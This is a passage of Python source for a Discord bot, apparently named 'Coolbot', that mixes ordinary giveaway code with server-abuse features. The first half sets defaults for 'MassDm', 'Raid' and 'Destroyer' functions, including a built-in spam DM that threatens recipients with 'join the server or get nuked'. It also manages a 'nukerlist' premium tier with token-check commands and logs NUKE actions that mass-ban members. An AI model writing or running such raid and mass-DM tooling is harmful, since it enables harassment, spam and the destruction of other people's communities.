            snapshot["emojis"].append({"name": emoji.name, "url": str(emoji.url)})
        for sticker in guild.stickers:
            snapshot["stickers"].append({"name": sticker.name, "url": str(sticker.url)})

        await _upd("👥 Snapshotting member roles…", 55)
        for member in guild.members:
            role_names = [r.name for r in member.roles if not r.is_default()]
            if role_names:
                snapshot["member_roles"][str(member.id)] = role_names

        await _upd("🔨 Snapshotting bans…", 62)
        try:
            async for ban_entry in guild.bans():
                snapshot["bans"].append({
                    "user_id": str(ban_entry.user.id),
                    "user_name": str(ban_entry.user),
                    "reason": ban_entry.reason or "",
                })
        except Exception:
            pass

        await _upd("💬 Fetching messages…", 68)
        readable = [ch for ch in guild.channels if isinstance(ch, (discord.TextChannel, discord.VoiceChannel, discord.StageChannel))]
        for ch in guild.channels:
            if isinstance(ch, (discord.TextChannel, discord.ForumChannel)):
                try:
                    readable.extend(ch.threads)
                except Exception:
                    pass

        async def _fetch_msgs(ch):
            try:
                msgs = []
                async for msg in ch.history(limit=100, oldest_first=False):
                    entry = {
                        "author": str(msg.author), "author_id": str(msg.author.id),
                        "avatar": str(msg.author.display_avatar.url),
                        "content": msg.content or "",
                        "timestamp": msg.created_at.isoformat(),
                        "attachments": [a.url for a in msg.attachments],
                    }
                    if msg.embeds:
                        e0 = msg.embeds[0]
                        entry["embed_title"]       = e0.title or ""
                        entry["embed_description"] = e0.description or ""
                    msgs.append(entry)
                return ch.name, msgs
            except Exception:
                return ch.name, []

        msg_results = await asyncio.gather(*[_fetch_msgs(ch) for ch in readable], return_exceptions=True)
        for res in msg_results:
            if isinstance(res, tuple):
                ch_name, msgs = res
                if msgs:
                    snapshot["messages"][ch_name] = msgs
        total_msgs = sum(len(v) for v in snapshot["messages"].values())

        await _upd("💾 Overwriting backup file…", 90)
        raw = json.dumps(snapshot, ensure_ascii=False).encode()
        with open(backup_path, "wb") as f:
            f.write(gzip.compress(raw, compresslevel=9))
        size_kb = os.path.getsize(backup_path) // 1024

        if dm_msg:
            try:
                await dm_msg.edit(
                    embed=discord.Embed(
                        title="✅ Backup Synced!",
                        description=(
                            f"{'🟦' * 10} **100%**\n\n"
                            f"**Code:** `{code.strip().upper()}` *(unchanged)*\n"
                            f"**Server:** {guild.name}\n"
                            f"**Roles:** {len(snapshot['roles'])} · "
                            f"**Channels:** {len(snapshot['channels'])} · "
                            f"**Categories:** {len(snapshot['categories'])}\n"
                            f"**Messages saved:** {total_msgs} · **File:** {size_kb} KB\n\n"
                            f"Use the same code with `/backup load` to restore this updated snapshot."
                        ),
                        color=COLORS["success"]
                    ).set_footer(text="Coolbot • Backup synced successfully")
                )
            except Exception:
                pass

        await interaction.followup.send(
            embed=discord.Embed(
                description=f"✅ Backup `{code.strip().upper()}` synced! {len(snapshot['roles'])} roles · {len(snapshot['channels'])} channels · {total_msgs} messages saved.",
                color=COLORS["success"]
            ),
            ephemeral=False
        )

    @app_commands.command(name="default", description="Set defaults for MassDm, Destroyer, or the server link swap (Owner only)")
    @app_commands.describe(
        type="What to configure",
        message="The value to set. Leave blank to clear/reset.",
    )
    @app_commands.choices(type=[
        app_commands.Choice(name="DM default",  value="massdm"),
        app_commands.Choice(name="Destroyer",   value="destroyer"),
        app_commands.Choice(name="Raid",        value="raid"),
        app_commands.Choice(name="ServerLink",  value="serverlink"),
    ])
    async def destroy_default(self, interaction: discord.Interaction, type: app_commands.Choice[str], message: str = ""):
        global _MASSDM_DEFAULT_MSG, _MASSDM_TEXT, _DEFAULT_SERVER_LINK, _RAID_DEFAULT_MSG
        if not has_owner_access(interaction.user):
            return await interaction.response.send_message(
                embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]),
                ephemeral=False,
            )

        if type.value == "massdm":
            if message.strip():
                _MASSDM_DEFAULT_MSG = message.strip()
                _MASSDM_TEXT = message.strip()
                await interaction.response.send_message(embed=discord.Embed(
                    title="✅ MassDm Default Set",
                    description=f"All bots will DM:\n\n> {message.strip()}",
                    color=COLORS["success"],
                ), ephemeral=False)
            else:
                _MASSDM_DEFAULT_MSG = ""
                _link = _DEFAULT_SERVER_LINK or "https://discord.gg/psfxUxRfPQ"
                _MASSDM_TEXT = (
                    "\U0001f43b\u200d\u2744\ufe0f **Coolbot MASSDM** \U0001f525\U0001f480\n"
                    "\u2501" * 32 + "\n"
                    "ur DMs are **cooked** \U0001f602 every bot we own just slid in \U0001f480\n"
                    "can't stop it. can't block it. it's already done. \U0001f525\n"
                    "\u2501" * 32 + "\n"
                    f"join the server or get nuked \U0001f480 {_link}"
                )
                await interaction.response.send_message(embed=discord.Embed(
                    description="✅ MassDm message reset to built-in default.",
                    color=COLORS["success"],
                ), ephemeral=False)

        elif type.value == "serverlink":
            raw = message.strip()
            # Basic validation — must look like a discord invite
            if raw and not re.search(r"discord\.gg/|discord\.com/invite/", raw):
                return await interaction.response.send_message(
                    embed=discord.Embed(
                        description="❌ Doesn't look like a Discord invite link.\nExample: `https://discord.gg/abc123`",
                        color=COLORS["error"],
                    ),
                    ephemeral=False,
                )
            if raw:
                _DEFAULT_SERVER_LINK = raw
                # Refresh massdm text to use the new link
                if not _MASSDM_DEFAULT_MSG:
                    _MASSDM_TEXT = (
                        "\U0001f43b\u200d\u2744\ufe0f **Dangerous person MASSDM** \U0001f525\U0001f480\n"
                        "\u2501" * 32 + "\n"
                        "ur DMs are **cooked** \U0001f602 every bot we own just slid in \U0001f480\n"
                        "can't stop it. can't block it. it's already done. \U0001f525\n"
                        "\u2501" * 32 + "\n"
                        f"join the server or get nuked \U0001f480 {raw}"
                    )
                # Refresh raid default to use the new link (only if no custom raid msg was set)
                if not _RAID_DEFAULT_MSG:
                    pass  # raid reads _DEFAULT_SERVER_LINK directly at call time — no extra refresh needed
                # Fetch invite so the help embed shows THAT server's real stats
                await interaction.response.defer(ephemeral=False)
                try:
                    # Extract just the code from the full URL
                    _code = raw.rstrip("/").split("/")[-1]
                    _inv  = await bot.fetch_invite(_code, with_counts=True)
                    _DISPLAY_SERVER_INFO.clear()
                    _DISPLAY_SERVER_INFO.update({
                        "name":         _inv.guild.name if _inv.guild else "Coolbot Server",
                        "members":      _inv.approximate_member_count or 0,
                        "online":       _inv.approximate_presence_count or 0,
                        "icon":         str(_inv.guild.icon.url) if (_inv.guild and _inv.guild.icon) else None,
                        "created_at":   _inv.guild.created_at.timestamp() if (_inv.guild and _inv.guild.created_at) else None,
                        "invite_url":   raw,
                    })
                    _gname = _DISPLAY_SERVER_INFO["name"]
                    _mc    = f"{_DISPLAY_SERVER_INFO['members']:,}"
                except Exception:
                    # Couldn't fetch invite — still set the link, just no cached stats
                    _DISPLAY_SERVER_INFO.clear()
                    _gname = "your server"
                    _mc    = "?"
                await interaction.followup.send(embed=discord.Embed(
                    title="✅ Default Server Link Set",
                    description=(
                        f"**{_gname}** ({_mc} members)\n\n"
                        f"Link swap active → `{raw}`\n"
                        f"Help embed & MassDm both updated."
                    ),
                    color=COLORS["success"],
                ), ephemeral=False)
            else:
                _DEFAULT_SERVER_LINK = ""
                _DISPLAY_SERVER_INFO.clear()
                await interaction.response.send_message(embed=discord.Embed(
                    description="✅ Server link cleared. Help embed back to default server. No more link swapping.",
                    color=COLORS["success"],
                ), ephemeral=False)

        elif type.value == "raid":
            if message.strip():
                _RAID_DEFAULT_MSG = message.strip()
                await interaction.response.send_message(embed=discord.Embed(
                    title="✅ Raid Default Set",
                    description=f"`,raid` with no message will send:\n\n> {message.strip()}",
                    color=COLORS["success"],
                ), ephemeral=False)
            else:
                _RAID_DEFAULT_MSG = ""
                await interaction.response.send_message(embed=discord.Embed(
                    description="✅ Raid message cleared. Back to built-in default.",
                    color=COLORS["success"],
                ), ephemeral=False)

        else:  # destroyer
            if message.strip():
                _DESTROY_DEFAULTS[0] = message.strip()
                save("destroy_defaults", {str(k): v for k, v in _DESTROY_DEFAULTS.items()})
                await interaction.response.send_message(embed=discord.Embed(
                    title="✅ Destroyer Default Set",
                    description=f"`,destroy` with no message will send:\n\n> {message.strip()}",
                    color=COLORS["success"],
                ), ephemeral=False)
            else:
                _DESTROY_DEFAULTS.pop(0, None)
                _DESTROY_DEFAULTS.pop("global", None)
                save("destroy_defaults", {str(k): v for k, v in _DESTROY_DEFAULTS.items()})
                await interaction.response.send_message(embed=discord.Embed(
                    description="✅ Destroyer message cleared. Back to built-in default.",
                    color=COLORS["success"],
                ), ephemeral=False)


    async def _premium_add_logic(self, interaction: discord.Interaction, user: discord.Member):
        if not has_owner_access(interaction.user):
            await interaction.response.send_message(
                embed=discord.Embed(description="❌ Only the owner can manage Premium users.", color=COLORS["error"]),
                ephemeral=False
            )
            return
        sl = load("nukerlist")
        if user.id not in sl:
            sl.append(user.id)
        save("nukerlist", sl)
        PREMIUM_USERS.add(user.id)
        await interaction.response.send_message(embed=discord.Embed(
            title="⭐ Premium Granted",
            description=(
                f"✅ **{user.display_name}** now has **Premium** access.\n\n"
                "**Unlocked commands:**\n"
                "• `/backupcreate` & `/backup load` & `,backupload`\n"
                "• `,servers` — list all bot servers\n"
                "• `,broadcast` — message all servers\n"
                "• `,default` — set custom destroy message\n"
                "• `,dm @user [message]` — send a DM (Owner/co-owner)\n"
                "• `,antinuke` — full antinuke system\n"
                "• `,resetinvites`, `,botcheck`, `,tokencheck`, `,tokenrenew`\n"
                "• `,serverinfo`, `,userinfo`, `,invitelb` and all public commands\n\n"
                "• `,dmall` — DM all members once (Owner/co-owner)"
            ),
            color=COLORS["main"]
        ))

    async def _premium_remove_logic(self, interaction: discord.Interaction, user: discord.Member):
        if not has_owner_access(interaction.user):
            await interaction.response.send_message(
                embed=discord.Embed(description="❌ Only the owner can manage Premium users.", color=COLORS["error"]),
                ephemeral=False
            )
            return
        sl = load("nukerlist")
        if user.id in sl:
            sl.remove(user.id)
        save("nukerlist", sl)
        PREMIUM_USERS.discard(user.id)
        await interaction.response.send_message(embed=discord.Embed(
            description=f"✅ **{user.display_name}**'s **Premium** access has been revoked.",
            color=COLORS["success"]
        ))

    async def _premium_view_logic(self, interaction: discord.Interaction):
        if not has_owner_access(interaction.user):
            await interaction.response.send_message(
                embed=discord.Embed(description="❌ Only the owner can view Premium users.", color=COLORS["error"]),
                ephemeral=False
            )
            return
        sl = load("nukerlist")
        if not sl:
            desc = "No **Premium** users yet. Use `/premium add` to grant access."
        else:
            lines = []
            for uid in sl:
                try:
                    u = await interaction.client.fetch_user(uid)
                    lines.append(f"⭐ **{u}** (`{uid}`)")
                except Exception:
                    lines.append(f"⭐ Unknown (`{uid}`)")
            desc = "\n".join(lines)
        await interaction.response.send_message(embed=discord.Embed(
            title="⭐ Premium Users",
            description=desc,
            color=COLORS["main"]
        ))

    @premium.command(name="add", description="Grant a user Premium access (backup, servers, broadcast & more)")
    @app_commands.describe(user="User to grant Premium")
    async def premium_add(self, interaction: discord.Interaction, user: discord.Member):
        await self._premium_add_logic(interaction, user)

    @premium.command(name="remove", description="Revoke a user's Premium access")
    @app_commands.describe(user="User to revoke Premium from")
    async def premium_remove(self, interaction: discord.Interaction, user: discord.Member):
        await self._premium_remove_logic(interaction, user)

    @premium.command(name="view", description="View all users with Premium access")
    async def premium_view(self, interaction: discord.Interaction):
        await self._premium_view_logic(interaction)

    @app_commands.command(name="premiumadd", description="Grant a user Premium access (Owner only)")
    @app_commands.describe(user="User to grant Premium")
    async def premiumadd_alias(self, interaction: discord.Interaction, user: discord.Member):
        await self._premium_add_logic(interaction, user)

    @app_commands.command(name="premiumremove", description="Revoke a user's Premium access (Owner only)")
    @app_commands.describe(user="User to revoke Premium from")
    async def premiumremove_alias(self, interaction: discord.Interaction, user: discord.Member):
        await self._premium_remove_logic(interaction, user)

    @app_commands.command(name="premiumview", description="View all Premium users (Owner only)")
    async def premiumview_alias(self, interaction: discord.Interaction):
        await self._premium_view_logic(interaction)

    @app_commands.command(name="premiumlogs", description="DM yourself the last 20 destroy/nuke actions (Owner only)")
    async def premiumlogs(self, interaction: discord.Interaction):
        if not has_owner_access(interaction.user):
            await interaction.response.send_message(
                embed=discord.Embed(description="❌ Only the owner can view nuker logs.", color=COLORS["error"]),
                ephemeral=False
            )
            return
        # Defer immediately — fetch_user + DM send can exceed 3 s under load
        await interaction.response.defer(ephemeral=False)
        logs = load("nuker_logs")
        if not isinstance(logs, list) or not logs:
            await interaction.followup.send(
                embed=discord.Embed(description="No nuker actions logged yet.", color=COLORS["info"]),
                ephemeral=False
            )
            return
        recent = logs[-20:][::-1]
        lines = []
        for entry in recent:
            action = entry.get("action", "?").upper()
            uid    = entry.get("user_id", "?")
            guild  = entry.get("guild", "?")
            t      = entry.get("time", "?")
            if action == "NUKE":
                banned = entry.get("banned", "?")
                lines.append(f"☢️ **NUKE** — <@{uid}> · {guild} · banned {banned} · {t} UTC")
            else:
                lines.append(f"💥 **DESTROY** — <@{uid}> · {guild} · {t} UTC")
        desc = "\n".join(lines)
        try:
            caller = await interaction.client.fetch_user(interaction.user.id)
            await caller.send(embed=discord.Embed(
                title="📋 Nuker Logs (last 20)",
                description=desc,
                color=COLORS["error"]
            ).set_footer(text="Coolbot • Most recent first"))
            await interaction.followup.send(
                embed=discord.Embed(description="✅ Logs sent to your DMs.", color=COLORS["success"]),
                ephemeral=False
            )
        except Exception:
            await interaction.followup.send(
                embed=discord.Embed(description=f"📋 **Nuker Logs**\n\n{desc}", color=COLORS["error"]),
                ephemeral=False
            )


    @app_commands.command(name="coinsadd", description="Add coins to a user (Owner)")
    @app_commands.describe(user="User to give coins to", amount="Amount of coins to add")
    async def coinsadd(self, interaction: discord.Interaction, user: discord.Member, amount: int):
        if not has_owner_access(interaction.user):
            return await interaction.response.send_message(
                embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]),
                ephemeral=True,
            )
        if amount == 0:
            return await interaction.response.send_message(
                embed=discord.Embed(description="❌ Amount cannot be 0.", color=COLORS["error"]),
                ephemeral=True,
            )
        ud = get_user_data(str(user.id))
        ud["balance"] = int(ud.get("balance", 0)) + int(amount)
        save_user_data(str(user.id), ud)
        await interaction.response.send_message(
            embed=discord.Embed(
                description=f"✅ Added **{amount:,}** coins to {user.mention}. New balance: **{ud['balance']:,}**.",
                color=COLORS["success"],
            ),
            ephemeral=False,
        )

    @app_commands.command(name="coinsremove", description="Remove coins from a user (Owner)")
    @app_commands.describe(user="User to remove coins from", amount="Amount of coins to remove")
    async def coinsremove(self, interaction: discord.Interaction, user: discord.Member, amount: int):
        if not has_owner_access(interaction.user):
            return await interaction.response.send_message(
                embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]),
                ephemeral=True,
            )
        if amount <= 0:
            return await interaction.response.send_message(
                embed=discord.Embed(description="❌ Amount must be positive.", color=COLORS["error"]),
                ephemeral=True,
            )
        ud = get_user_data(str(user.id))
        ud["balance"] = max(0, int(ud.get("balance", 0)) - int(amount))
        save_user_data(str(user.id), ud)
        await interaction.response.send_message(
            embed=discord.Embed(
                description=f"✅ Removed **{amount:,}** coins from {user.mention}. New balance: **{ud['balance']:,}**.",
                color=COLORS["success"],
            ),
            ephemeral=False,
        )


#  COG — GIVEAWAYS  (GiveawayBoat style — button entry)

def _gw_time_str(seconds: int) -> str:
    seconds = max(0, int(seconds))
    d, rem = divmod(seconds, 86400)
    h, rem = divmod(rem, 3600)
    m, s   = divmod(rem, 60)
    parts  = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    if s or not parts: parts.append(f"{s}s")
    return " ".join(parts)

#  GIVEAWAY HELPERS  (Advanced GiveawayBoat-style)

def _gw_time_str(seconds: float) -> str:
    seconds = max(0, int(seconds))
    if seconds == 0:
        return "Ended"
    d, r = divmod(seconds, 86400)
    h, r = divmod(r, 3600)
    m, s = divmod(r, 60)
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    if s or not parts: parts.append(f"{s}s")
    return " ".join(parts)

def _gw_req_lines(ginfo: dict) -> str:
    out = []
    if ginfo.get("required_role"):
        out.append(f"📋 **Required Role:** <@&{ginfo['required_role']}>")
    if ginfo.get("bypass_role"):
        out.append(f"🔓 **Bypass Role:** <@&{ginfo['bypass_role']}>")
    if ginfo.get("blacklist_role"):
        out.append(f"🚫 **Blacklist Role:** <@&{ginfo['blacklist_role']}>")
    if ginfo.get("bonus_roles"):
        for rid, mult in ginfo["bonus_roles"].items():
            out.append(f"⭐ **Bonus {mult}x entries:** <@&{rid}>")
    if ginfo.get("min_account_age"):
        out.append(f"🗓️ **Min account age:** {_gw_time_str(ginfo['min_account_age'])}")
    if ginfo.get("min_server_age"):
        out.append(f"🏠 **Min server age:** {_gw_time_str(ginfo['min_server_age'])}")
    if ginfo.get("max_entries"):
        out.append(f"🎟️ **Entry cap:** {ginfo['max_entries']:,}")
    return "\n".join(out)

def _gw_active_embed(ginfo: dict) -> discord.Embed:
    prize    = ginfo["prize"]
    end_time = ginfo["end_time"]
    host_id  = ginfo["host_id"]
    winners  = ginfo.get("winners", 1)
    entries  = ginfo.get("entries", [])
    paused   = ginfo.get("paused", False)
    left     = max(0, end_time - datetime.now(timezone.utc).timestamp())
    end_dt   = datetime.fromtimestamp(end_time, tz=timezone.utc)
    unique   = len(set(entries))
    tickets  = len(entries)

    status = "⏸️ **PAUSED**" if paused else f"**⏰ Ends:** <t:{int(end_time)}:R>  ({_gw_time_str(left)})"
    desc = f"**🏆 Winners:** {winners}\n**👑 Hosted by:** <@{host_id}>\n{status}\n"
    req = _gw_req_lines(ginfo)
    if req:
        desc += f"\n━━━━━━━━━━━━━━━━━━\n{req}\n"

    e = discord.Embed(
        title=f"🎉  {prize}",
        description=desc,
        color=0xFF416C if not paused else 0xFEE75C,
    )
    note = f"  •  {tickets} tickets" if tickets != unique else ""
    e.set_footer(
        text=f"🎟 {unique:,} {'entry' if unique == 1 else 'entries'}{note}  •  Ends {end_dt.strftime('%b %d, %Y %H:%M UTC')}"
    )
    if ginfo.get("image_url"):
        e.set_thumbnail(url=ginfo["image_url"])
    return e

def _gw_ended_embed(ginfo: dict, winner_mentions: list) -> discord.Embed:
    prize  = ginfo["prize"]
    host_id = ginfo["host_id"]
    entries = ginfo.get("entries", [])
    unique  = len(set(entries))
    won_txt = " ".join(winner_mentions) if winner_mentions else "No valid entries"
    e = discord.Embed(
        title=f"🎁  {prize}",
        description=(
            f"**🏆 Winner{'s' if len(winner_mentions) != 1 else ''}:** {won_txt}\n"
            f"**🎟️ Total Entries:** {unique:,}\n"
            f"**👑 Hosted by:** <@{host_id}>"
        ),
        color=0x2F3136,
    )
    e.set_footer(text="Giveaway Ended")
    if ginfo.get("image_url"):
        e.set_thumbnail(url=ginfo["image_url"])
    return e


class GiveawayEnterView(discord.ui.View):
    """Persistent view — Advanced GiveawayBoat-style enter/leave + My Entries info."""

    def __init__(self, msg_id: str, entry_count: int = 0, ended: bool = False, ticket_count: int = 0):
        super().__init__(timeout=None)
        self.msg_id = msg_id
        label = f"  {ticket_count:,}" if ticket_count else f"  {entry_count:,}"
        btn = discord.ui.Button(
            label=label, emoji="🎉",
            style=discord.ButtonStyle.primary if not ended else discord.ButtonStyle.secondary,
            custom_id=f"gw_enter_{msg_id}", disabled=ended, row=0,
        )
        btn.callback = self._enter_callback
        self.add_item(btn)
        info_btn = discord.ui.Button(
            label="My Entries", emoji="🎟️",
            style=discord.ButtonStyle.secondary,
            custom_id=f"gw_info_{msg_id}", row=0,
        )
        info_btn.callback = self._info_callback
        self.add_item(info_btn)

    async def _enter_callback(self, interaction: discord.Interaction):
        gid  = self.msg_id
        uid  = interaction.user.id
        data = load("giveaways")
        if gid not in data or data[gid].get("ended"):
            return await interaction.response.send_message("❌ This giveaway has already ended.", ephemeral=False)
        ginfo = data[gid]
        if ginfo.get("paused"):
            return await interaction.response.send_message("⏸️ This giveaway is currently paused.", ephemeral=False)

        entries = ginfo.get("entries", [])
        uid_set = set(entries)
        max_e   = ginfo.get("max_entries")
        if max_e and len(uid_set) >= max_e and uid not in uid_set:
            return await interaction.response.send_message(
                f"❌ Entry cap of **{max_e:,}** reached.", ephemeral=False)

        member = interaction.guild.get_member(uid) if interaction.guild else None

        bl_rid = ginfo.get("blacklist_role")
        if bl_rid and member and any(r.id == bl_rid for r in member.roles):
            return await interaction.response.send_message("🚫 You are blacklisted from this giveaway.", ephemeral=False)

        req_rid    = ginfo.get("required_role")
        byp_rid    = ginfo.get("bypass_role")
        has_bypass = member and byp_rid and any(r.id == byp_rid for r in member.roles)
        if req_rid and member and not has_bypass:
            if not any(r.id == req_rid for r in member.roles):
                return await interaction.response.send_message(
                    f"❌ You need <@&{req_rid}> to enter.", ephemeral=False)

        min_acct_age = ginfo.get("min_account_age")
        if min_acct_age and not has_bypass:
            acct_age = (datetime.now(timezone.utc) - interaction.user.created_at).total_seconds()
            if acct_age < min_acct_age:
                return await interaction.response.send_message(
                    f"❌ Account too new — wait **{_gw_time_str(min_acct_age - acct_age)}** more.", ephemeral=False)

        min_join_age = ginfo.get("min_server_age")
        if min_join_age and member and member.joined_at and not has_bypass:
            join_age = (datetime.now(timezone.utc) - member.joined_at).total_seconds()
            if join_age < min_join_age:
                return await interaction.response.send_message(
                    f"❌ Joined too recently — wait **{_gw_time_str(min_join_age - join_age)}** more.", ephemeral=False)

        if uid in uid_set:
            entries = [e for e in entries if e != uid]
            data[gid]["entries"] = entries
            save("giveaways", data)
            view = GiveawayEnterView(gid, len(set(entries)), ticket_count=len(entries))
            await interaction.response.edit_message(embed=_gw_active_embed(data[gid]), view=view)
            await interaction.followup.send("✅ You **left** the giveaway.", ephemeral=False)
        else:
            tickets = 1
            bonus_roles = ginfo.get("bonus_roles", {})
            if member and bonus_roles:
                mrids = {str(r.id) for r in member.roles}
                for rid, mult in bonus_roles.items():
                    if rid in mrids:
                        tickets = max(tickets, int(mult))
            for _ in range(tickets):
                entries.append(uid)
            data[gid]["entries"] = entries
            save("giveaways", data)
            view = GiveawayEnterView(gid, len(set(entries)), ticket_count=len(entries))
            await interaction.response.edit_message(embed=_gw_active_embed(data[gid]), view=view)
            msg = (
                f"🎉 Entered with **{tickets}x bonus tickets** for **{ginfo['prize']}**! Good luck!"
                if tickets > 1 else
                f"🎉 You **entered** the giveaway for **{ginfo['prize']}**! Good luck!"
            )
            await interaction.followup.send(msg, ephemeral=False)

    async def _info_callback(self, interaction: discord.Interaction):
        gid  = self.msg_id
        uid  = interaction.user.id
        data = load("giveaways")
        if gid not in data:
            return await interaction.response.send_message("❌ Giveaway not found.", ephemeral=False)
        ginfo   = data[gid]
        entries = ginfo.get("entries", [])
        my_tix  = entries.count(uid)
        total   = len(entries)
        unique  = len(set(entries))
        chance  = f"{(my_tix / total * 100):.1f}%" if total and my_tix else "0%"
        if my_tix:
            txt = (
                f"🎟️ **Your tickets:** {my_tix}\n"
                f"📊 **Win chance:** {chance}\n"
                f"👥 **Total entrants:** {unique:,}\n"
                f"🎫 **Total tickets in pool:** {total:,}"
            )
        else:
            txt = "You have **not entered** this giveaway yet.\nClick 🎉 to enter!"
        await interaction.response.send_message(txt, ephemeral=False)


#  COG — GIVEAWAYS  (Advanced GiveawayBoat-style)
class Giveaways(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.giveaway_check.start()
        self.giveaway_live_update.start()

    def cog_unload(self):
        self.giveaway_check.cancel()
        self.giveaway_live_update.cancel()

    @tasks.loop(seconds=15)
    async def giveaway_live_update(self):
        try:
            data = load("giveaways")
            now  = datetime.now(timezone.utc).timestamp()
            for gid, ginfo in list(data.items()):
                if ginfo.get("ended"): continue
                if now >= ginfo.get("end_time", float("inf")): continue
                try:
                    guild = self.bot.get_guild(ginfo["guild_id"])
                    if not guild: continue
                    ch = guild.get_channel(ginfo["channel_id"])
                    if not ch: continue
                    msg = await ch.fetch_message(int(gid))
                    entries = ginfo.get("entries", [])
                    view = GiveawayEnterView(gid, len(set(entries)), ticket_count=len(entries))
                    await msg.edit(embed=_gw_active_embed(ginfo), view=view)
                except Exception:
                    pass
        except Exception:
            pass

    @tasks.loop(seconds=10)
    async def giveaway_check(self):
        try:
            data = load("giveaways")
            now  = datetime.now(timezone.utc).timestamp()
            for gid, ginfo in list(data.items()):
                if ginfo.get("ended"): continue
                if ginfo.get("paused"): continue
                if now >= ginfo.get("end_time", float("inf")):
                    await self._end_giveaway(gid, ginfo)
                    data = load("giveaways")
        except Exception:
            pass

    async def _pick_winners(self, ginfo: dict) -> list:
        entries = list(ginfo.get("entries", []))
        n       = min(ginfo.get("winners", 1), len(set(entries)))
        if not entries or n == 0:
            return []
        winners = []
        pool    = entries[:]
        for _ in range(n):
            if not pool: break
            chosen = random.choice(pool)
            winners.append(chosen)
            pool = [e for e in pool if e != chosen]
        return winners

    async def _end_giveaway(self, gid: str, ginfo: dict):
        try:
            guild = self.bot.get_guild(ginfo["guild_id"])
            if not guild: return
            ch = guild.get_channel(ginfo["channel_id"])
            if not ch: return
            msg = await ch.fetch_message(int(gid))
            winner_ids      = await self._pick_winners(ginfo)
            winner_mentions = []
            for wid in winner_ids:
                member = guild.get_member(wid) or await self.bot.fetch_user(wid)
                winner_mentions.append(member.mention if member else f"<@{wid}>")
            entries    = ginfo.get("entries", [])
            ended_view = GiveawayEnterView(gid, len(set(entries)), ended=True, ticket_count=len(entries))
            await msg.edit(embed=_gw_ended_embed(ginfo, winner_mentions), view=ended_view)
            if winner_mentions:
                won_txt = " ".join(winner_mentions)
                ann = discord.Embed(
                    title="🎊 Giveaway Ended!",
                    description=(
                        f"**Prize:** {ginfo['prize']}\n"
                        f"**Winner{'s' if len(winner_mentions) != 1 else ''}:** {won_txt}\n\nCongratulations! 🎉"
                    ),
                    color=0xFF416C,
                )
                ann.set_footer(
                    text=f"Hosted by <@{ginfo['host_id']}> • {len(set(entries)):,} entrants • {len(entries):,} tickets"
                )
                ping = f"<@&{ginfo['ping_role']}> " if ginfo.get("ping_role") else ""
                await ch.send(content=f"{ping}🎉 Congratulations {won_txt}! You won **{ginfo['prize']}**!", embed=ann)
            else:
                await ch.send(embed=discord.Embed(
                    description=f"❌ Giveaway for **{ginfo['prize']}** ended with no valid entries.",
                    color=COLORS["error"]
                ))
            data = load("giveaways")
            if gid in data:
                data[gid]["ended"]         = True
                data[gid]["winners_drawn"] = winner_ids
                save("giveaways", data)
        except Exception:
            pass

    @commands.hybrid_command(name="giveaway", aliases=["gstart", "gcreate"])
    async def giveaway(self, ctx, duration: str, winners: str = "1", *, prize: str):
        """
        Advanced giveaway. Usage: ,giveaway <time> [winners] <prize> [options]

        Options (append after prize):
          --role @Role         Only this role can enter
          --bypass @Role       This role bypasses all requirements
          --blacklist @Role    This role cannot enter
          --bonus @Role:2      Give this role 2x tickets (max 10x)
          --ping @Role         Ping this role when giveaway starts
          --age 7d             Min Discord account age
          --join 24h           Min server membership age
          --cap 500            Max number of unique entrants
          --image <url>        Thumbnail image for the embed

        Examples:
          ,giveaway 1h 3 Nitro Classic --role @Member --bonus @Booster:3
          ,giveaway 30m $10 PayPal --cap 100 --age 30d
        """
        if not is_staff(ctx.author): return
        try:
            win_count = max(1, min(20, int(winners)))
        except ValueError:
            prize     = f"{winners} {prize}".strip()
            win_count = 1

        required_role = bypass_role = blacklist_role = ping_role = None
        bonus_roles   = {}
        min_account_age = min_server_age = max_entries = image_url = None

        def pop_opt(flag, text):
            m = re.search(rf"--{flag}\s+(https?://\S+|\S+)", text)
            if m:
                return m.group(1), text.replace(m.group(0), "").strip()
            return None, text

        def pop_role(flag, text):
            m = re.search(rf"--{flag}\s+<@&?(\d+)>", text)
            if m:
                return int(m.group(1)), text.replace(m.group(0), "").strip()
            return None, text

        image_url,    prize = pop_opt("image",     prize)
        cap_str,      prize = pop_opt("cap",        prize)
        age_str,      prize = pop_opt("age",        prize)
        join_str,     prize = pop_opt("join",       prize)
        if cap_str:
            try: max_entries = int(cap_str)
            except: pass
        if age_str:  min_account_age = parse_duration(age_str)
        if join_str: min_server_age  = parse_duration(join_str)

        required_role,  prize = pop_role("role",      prize)
        bypass_role,    prize = pop_role("bypass",    prize)
        blacklist_role, prize = pop_role("blacklist", prize)
        ping_role,      prize = pop_role("ping",      prize)

        for bm in re.finditer(r"--bonus\s+<@&?(\d+)>:(\d+)", prize):
            bonus_roles[str(bm.group(1))] = min(10, max(2, int(bm.group(2))))
        prize = re.sub(r"--bonus\s+<@&?\d+>:\d+", "", prize).strip()

        if not prize.strip():
            return await ctx.send(embed=discord.Embed(description="❌ Please provide a prize.", color=COLORS["error"]))

        secs = parse_duration(duration)
        if not secs:
            return await ctx.send(embed=discord.Embed(
                description="❌ Invalid duration. Examples: `30s` `5m` `2h` `1d`", color=COLORS["error"]))

        end_time = (datetime.now(timezone.utc) + timedelta(seconds=secs)).timestamp()
        ginfo = {
            "prize": prize, "guild_id": ctx.guild.id, "channel_id": ctx.channel.id,
            "end_time": end_time, "host_id": ctx.author.id, "winners": win_count,
            "entries": [], "ended": False, "paused": False,
            "required_role": required_role, "bypass_role": bypass_role,
            "blacklist_role": blacklist_role, "bonus_roles": bonus_roles,
            "ping_role": ping_role, "min_account_age": min_account_age,
            "min_server_age": min_server_age, "max_entries": max_entries,
            "image_url": image_url,
        }
        ping_content = f"<@&{ping_role}>" if ping_role else None
        view = GiveawayEnterView("PLACEHOLDER", 0)
        msg  = await ctx.send(content=ping_content, embed=_gw_active_embed(ginfo), view=view)
        data = load("giveaways")
        data[str(msg.id)] = ginfo
        save("giveaways", data)
        await msg.edit(content=None, view=GiveawayEnterView(str(msg.id), 0))

    @commands.hybrid_command(name="gend")
    async def gend(self, ctx, msg_id: int):
        """End a giveaway early and draw winners now."""
        if not is_staff(ctx.author): return
        data = load("giveaways"); gid = str(msg_id)
        if gid not in data or data[gid].get("ended"):
